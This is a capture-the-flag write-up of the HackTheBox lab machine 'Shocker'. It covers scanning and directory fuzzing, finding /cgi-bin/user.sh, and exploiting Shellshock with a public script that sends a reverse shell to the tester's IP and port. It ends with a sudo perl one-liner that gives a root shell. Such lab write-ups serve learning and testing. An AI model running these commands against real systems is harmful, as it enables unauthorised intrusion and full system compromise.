Add the correlated IP address to the `/etc/hosts` file.

![[HackTheBox/Shocker/images/1.png]]


Run the following `nmap` scans:

```bash

nmap -sV -sC -Pn shocker.htb

nmap -sV --script=vuln -Pn shocker.htb

```


Service detection and banner grabbing with default scripts:

![[HackTheBox/Shocker/images/2.png]]

Full port scan: Find non-standard ports faster with `--min-rate`:

![[HackTheBox/Shocker/images/3.png]]

The service + CVE vulnerability scan took a lot of time as predicted and brought noisy results, so skip this one.

![[HackTheBox/Shocker/images/4.png]]

![[HackTheBox/Shocker/images/6.png]]


![[HackTheBox/Shocker/images/5.png]]

On the HTTP port, the machine was actually trolling me. Let's start conducting a fuzzing operation via `feroxbuster`, `gobuster`, and `dirsearch`.

I will conduct a comprehensive fuzzing session for this machine, as the port results were not sufficient in my opinion.

```bash
dirsearch -u http://shocker.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

![[HackTheBox/Shocker/images/7.png]]

```bash
gobuster dir -u http://shocker.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 40 --no-error

gobuster dir -u http://shocker.htb -w /usr/share/wordlists/dirb/common.txt -t 40 --no-error

feroxbuster -u http://shocker.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 40

feroxbuster -u http://shocker.htb -w /usr/share/wordlists/dirb/common.txt -t 40
```

By default, `dirsearch` did not provide juicy results. Therefore, it is more suitable to apply solely `feroxbuster` and `gobuster`. However, I noticed it is related to wordlist choice.

![[HackTheBox/Shocker/images/8.png]]

![[HackTheBox/Shocker/images/9.png]]

`common.txt` worked perfectly fine. Let's check all endpoints, even those that returned `400` codes.

![[HackTheBox/Shocker/images/10.png]]

`Ferox` also identified valuable endpoints for deeper scans. Although there were distinct surfaces like `.htpasswd` and `.hta`, `/cgi-bin/` opens another corridor for us to explore.

![[HackTheBox/Shocker/images/11.png]]

I could not identify any further results from `cgi-bin`.

Performed a scan with the famous wordlist `OneListForAll`, yet did not get any juicy results.

[OneListForAll](https://github.com/six2dez/OneListForAll)

A more advanced approach is to fuzz for files with specific extensions such as `.sh`, `.php`, `.asp`, `.aspx`, and so on.

I decided to use `ffuf` for more targeted discovery.

[Usage Example](https://medium.com/@sumayasomow/attacking-web-applications-with-ffuf-378df7ba72ff)

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://shocker.htb/cgi-bin/FUZZ.php

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://shocker.htb/cgi-bin/FUZZ.sh
```

You can include more extensions; I applied only the ones that came to mind.

![[HackTheBox/Shocker/images/12.png]]

Navigating to the discovered `user.sh` file:

![[HackTheBox/Shocker/images/13.png]]

A Google search for `cgi bin user.sh exploit` reveals Shellshock as the exploitation method.

![[HackTheBox/Shocker/images/14.png]]

I will not use `metasploit`, so I will use a manual exploit.

For exploitation, use the following GitHub generic exploit:

[Shellshock](https://github.com/b4keSn4ke/CVE-2014-6271/blob/main/shellshock.py)

`python shock.py 10.10.14.79 1234 http://shocker.htb/cgi-bin/user.sh`

![[HackTheBox/Shocker/images/15.png]]

Caught the reverse shell via `penelope -p 1234`.

[Penelope](https://github.com/brightio/penelope)

Auto PTY upgrade was in place.

![[HackTheBox/Shocker/images/16.png]]

Check GTFOBins and discover the commands that `shelly` can run as sudo.

![[HackTheBox/Shocker/images/17.png]]

Direct `perl` sudo binary exploitation is possible.

![[HackTheBox/Shocker/images/19.png]]

```bash
sudo perl -e 'exec "/bin/sh"'
```

![[HackTheBox/Shocker/images/18.png]]

May The Pentest Be With You ! ! !

![[20.jpg]]